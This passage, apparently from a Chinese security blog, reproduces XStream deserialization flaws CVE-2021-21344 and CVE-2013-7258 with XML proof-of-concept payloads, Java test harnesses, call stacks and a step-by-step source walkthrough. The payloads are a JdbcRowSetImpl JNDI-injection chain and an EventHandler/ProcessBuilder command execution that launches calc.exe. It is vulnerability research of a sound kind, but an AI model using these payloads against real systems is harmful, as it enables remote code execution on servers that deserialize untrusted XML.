class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试文件：里面的xml为上面的POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE202121344</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong>：<br>第一：java.util.PriorityQueue<br>根据POC的根节点使用的是PriorityQueue，这也是链的第一步，在反序列化的过程中会调用其readObject函数<br>在CC2中了解到此链的触发点是comparator的compare函数，POC中将compara设置成sun.awt.datatransfer.DataTransferer$IndexOrderComparator<br>第二：sun.awt.datatransfer.DataTransferer<br>成功设置comparator后，在调用PriorityQueue函数的siftDownUsingComparator方法后，会成功跳转至DataTransferer的compare方法，接着后面的某段链没了解过<br>第三：com.sun.rowset.JdbcRowSetImpl<br>来到JdbcRowSetImpl的getDatabaseMetaData方法,在里面它调用connect方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> DatabaseMetaData <span class="title function_">getDatabaseMetaData</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.connect();</span><br><span class="line">    <span class="keyword">return</span> var1.getMetaData();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此链在fastjson中使用过，查看其connect方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="built_in">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getUrl() != <span class="literal">null</span> ? DriverManager.getConnection(<span class="built_in">this</span>.getUrl(), <span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里通过JNDI去lookup存放在属性dataSource的地址，在上面的POC中我们将dataSource设置成了恶意的rmi地址<br>第四步：JNDI注入<br>接下来的过程就是JNDI注入的那一套了<br><strong>函数调用栈</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">142</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">decodeObject:<span class="number">464</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">124</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">connect:<span class="number">624</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">get:<span class="number">343</span>, Accessor$GetterSetterReflection (com.sun.xml.internal.bind.v2.runtime.reflect)</span><br><span class="line">serializeURIs:<span class="number">402</span>, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">childAsXsiType:<span class="number">662</span>, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">write:<span class="number">256</span>, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:<span class="number">89</span>, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:<span class="number">130</span>, Bridge (com.sun.xml.internal.bind.api)</span><br><span class="line">marshal:<span class="number">161</span>, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)</span><br><span class="line">writeTo:<span class="number">109</span>, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">asInputStream:<span class="number">99</span>, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getInputStream:<span class="number">125</span>, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getMessage:<span class="number">366</span>, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:<span class="number">465</span>, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:<span class="number">103</span>, MessageWrapper (com.sun.xml.internal.ws.api.message)</span><br><span class="line">get:<span class="number">111</span>, ResponseContext (com.sun.xml.internal.ws.client)</span><br><span class="line">compareIndices:<span class="number">2492</span>, DataTransferer$IndexedComparator (sun.awt.datatransfer)</span><br><span class="line">compare:<span class="number">2970</span>, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">795</span>, PriorityQueue (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">callReadObject:<span class="number">132</span>, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:<span class="number">443</span>, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:<span class="number">277</span>, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">72</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1409</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1388</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1273</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1264</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">112</span>, CVE202121344 (Xstream)</span><br></pre></td></tr></table></figure>

<h1 id="CVE-2013-7258"><a href="#CVE-2013-7258" class="headerlink" title="CVE-2013-7258"></a>CVE-2013-7258</h1><p><strong>影响版本</strong>：1.4.x-1.4.6及1.4.10<br><strong>测试环境</strong>：XStream1.4.5 JDK1.8_66<br><strong>复现</strong>：<br>POC</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/C<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试文件：里面的XML为上面的POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE20137258</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong>：<br>根据前面的fromXML的流程，单步执行至TreeUnmarshaller的start函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">start</span><span class="params">(DataHolder dataHolder)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.dataHolder = dataHolder;</span><br><span class="line">    <span class="comment">// 根据XML的根标签获取对应的class</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">type</span> <span class="operator">=</span> HierarchicalStreams.readClassType(<span class="built_in">this</span>.reader, <span class="built_in">this</span>.mapper);</span><br><span class="line">    <span class="comment">// 将对应的class转换成Java对象</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.convertAnother((Object)<span class="literal">null</span>, type);</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">validations</span> <span class="operator">=</span> <span class="built_in">this</span>.validationList.iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(validations.hasNext()) &#123;</span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">runnable</span> <span class="operator">=</span> (Runnable)validations.next();</span><br><span class="line">        runnable.run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入readClassType函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title function_">readClassType</span><span class="params">(HierarchicalStreamReader reader, Mapper mapper)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">classAttribute</span> <span class="operator">=</span> readClassAttribute(reader, mapper);</span><br><span class="line">    Class type;</span><br><span class="line">    <span class="keyword">if</span> (classAttribute == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 根据节点名从mapper中得到对应的type</span></span><br><span class="line">        type = mapper.realClass(reader.getNodeName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        type = mapper.realClass(classAttribute);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入realClass函数:com\thoughtworks\xstream\mapper\CachingMapper.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class <span class="title function_">realClass</span><span class="params">(String elementName)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取根元素</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">cached</span> <span class="operator">=</span> <span class="built_in">this</span>.realClassCache.get(elementName);</span><br><span class="line">    <span class="comment">// 如果realClassCache中存在，直接返回即可</span></span><br><span class="line">    <span class="keyword">if</span> (cached != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cached <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Class)cached;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> (CannotResolveClassException)cached;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 调用父类的realClass继续解析</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">super</span>.realClass(elementName);</span><br><span class="line">            <span class="comment">// 并将其存放至realClassCache</span></span><br><span class="line">            <span class="built_in">this</span>.realClassCache.put(elementName, result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotResolveClassException var4) &#123;</span><br><span class="line">            <span class="built_in">this</span>.realClassCache.put(elementName, var4);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到了根元素的class，返回至TreeUnmarshaller的start函数，这时来到了下面这条语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.convertAnother((Object)<span class="literal">null</span>, type);</span><br></pre></td></tr></table></figure>

<p>此时的type正是上面获取的class：java.util.SortedSet<br>进入TreeUnmarshaller的convertAnother函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">convertAnother</span><span class="params">(Object parent, Class type)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.convertAnother(parent, type, (Converter)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>转换成3个参数的convertAnother函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">convertAnother</span><span class="params">(Object parent, Class type, Converter converter)</span> &#123;</span><br><span class="line">    type = <span class="built_in">this</span>.mapper.defaultImplementationOf(type);</span><br><span class="line">    <span class="keyword">if</span> (converter == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 根据type获取对应的converter</span></span><br><span class="line">        converter = <span class="built_in">this</span>.converterLookup.lookupConverterForType(type);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!converter.canConvert(type)) &#123;</span><br><span class="line">        <span class="type">ConversionException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Explicit selected converter cannot handle type&quot;</span>);</span><br><span class="line">        e.add(<span class="string">&quot;item-type&quot;</span>, type.getName());</span><br><span class="line">        e.add(<span class="string">&quot;converter-type&quot;</span>, converter.getClass().getName());</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 然后将type转换成对应的object</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.convert(parent, type, converter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的converter是TreeSetConverter转换器，其中lookupConverterForType函数在上面分析过<br>接下来进入到AbstractReferenceUnmarshaller.class的convert函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">convert</span><span class="params">(Object parent, Class type, Converter converter)</span> &#123;</span><br><span class="line">    Object result;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.parentStack.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        result = <span class="built_in">this</span>.parentStack.peek();</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.values.containsKey(result)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.values.put(result, parent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 从mapper中获取reference别名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">attributeName</span> <span class="operator">=</span> <span class="built_in">this</span>.getMapper().aliasForSystemAttribute(<span class="string">&quot;reference&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">reference</span> <span class="operator">=</span> attributeName == <span class="literal">null</span> ? <span class="literal">null</span> : <span class="built_in">this</span>.reader.getAttribute(attributeName);</span><br><span class="line">    Object cache;</span><br><span class="line">    <span class="keyword">if</span> (reference != <span class="literal">null</span>) &#123;</span><br><span class="line">        cache = <span class="built_in">this</span>.values.get(<span class="built_in">this</span>.getReferenceKey(reference));</span><br><span class="line">        <span class="keyword">if</span> (cache == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ConversionException</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Invalid reference&quot;</span>);</span><br><span class="line">            ex.add(<span class="string">&quot;reference&quot;</span>, reference);</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result = cache == NULL ? <span class="literal">null</span> : cache;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 获取当前标签</span></span><br><span class="line">        cache = <span class="built_in">this</span>.getCurrentReferenceKey();</span><br><span class="line">        <span class="comment">// 并将其压入栈中</span></span><br><span class="line">        <span class="built_in">this</span>.parentStack.push(cache);</span><br><span class="line">        <span class="comment">// 然后调用父类的convert方法</span></span><br><span class="line">        result = <span class="built_in">super</span>.convert(parent, type, converter);</span><br><span class="line">        <span class="keyword">if</span> (cache != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.values.put(cache, result == <span class="literal">null</span> ? NULL : result);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.parentStack.popSilently();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看TreeUnmarshaller的convert方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">convert</span><span class="params">(Object parent, Class type, Converter converter)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="built_in">this</span>.types.push(type);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> converter.unmarshal(<span class="built_in">this</span>.reader, <span class="built_in">this</span>);</span><br><span class="line">        <span class="built_in">this</span>.types.popSilently();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ConversionException var6) &#123;</span><br><span class="line">        <span class="built_in">this</span>.addInformationTo(var6, type, converter, parent);</span><br><span class="line">        <span class="keyword">throw</span> var6;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var7) &#123;</span><br><span class="line">        <span class="type">ConversionException</span> <span class="variable">conversionException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(var7);</span><br><span class="line">        <span class="built_in">this</span>.addInformationTo(conversionException, type, converter, parent);</span><br><span class="line">        <span class="keyword">throw</span> conversionException;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面得到了converter是TreeSetConverter转换器，现在调用其unmarshal方法，进入该方法，最终会到下面这句代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);</span><br></pre></td></tr></table></figure>

<p>进入该函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">populateTreeMap</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context, TreeMap result, Comparator comparator)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">inFirstElement</span> <span class="operator">=</span> comparator == NULL_MARKER;</span><br><span class="line">    <span class="keyword">if</span> (inFirstElement) &#123;</span><br><span class="line">        comparator = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">SortedMap</span> <span class="variable">sortedMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PresortedMap</span>(comparator != <span class="literal">null</span> &amp;&amp; JVM.hasOptimizedTreeMapPutAll() ? comparator : <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (inFirstElement) &#123;</span><br><span class="line">        <span class="comment">// 将当前的内容存入Map中</span></span><br><span class="line">        <span class="built_in">this</span>.putCurrentEntryIntoMap(reader, context, result, sortedMap);</span><br><span class="line">        reader.moveUp();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.populateMap(reader, context, result, sortedMap);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入putCurrentEntryIntoMap方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">putCurrentEntryIntoMap</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context, Map map, Map target)</span> &#123;</span><br><span class="line">    <span class="comment">// 读取标签的内容并将其放入target这个Map中</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> <span class="built_in">this</span>.readItem(reader, context, map);</span><br><span class="line">    target.put(key, key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一直跟进，在CachingMapper.class的realClass中会获得里面嵌套的标签&lt;String&gt;，获取到后会将该标签的值foo存入target中，继续单步获取内嵌的下一个标签<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719193632.png"><br>进入该函数，单步执行，一直跟着标签名寻找对应的类<br>最后在com\thoughtworks\xstream\mapper\DynamicProxyMapper.class的realClass方法中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class <span class="title function_">realClass</span><span class="params">(String elementName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> elementName.equals(<span class="built_in">this</span>.alias) ? DynamicProxy.class : <span class="built_in">super</span>.realClass(elementName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的this.alias就是dynamic-proxy，这里相等即返回DynamicProxy.class<br>F8一直返回到AbstractCollectionConverter的readItem方法，执行下一条语句，进入convertAnother方法，一直到TreeUnmarshaller的convertAnother方法，这里会得到converter为DynamicProxyConverter<br>又是同样的流程解析dynamic-proxy里面的标签内容<br>模仿上面的流程来到DynamicProxyConverter.class中的unmarshal函数</p>
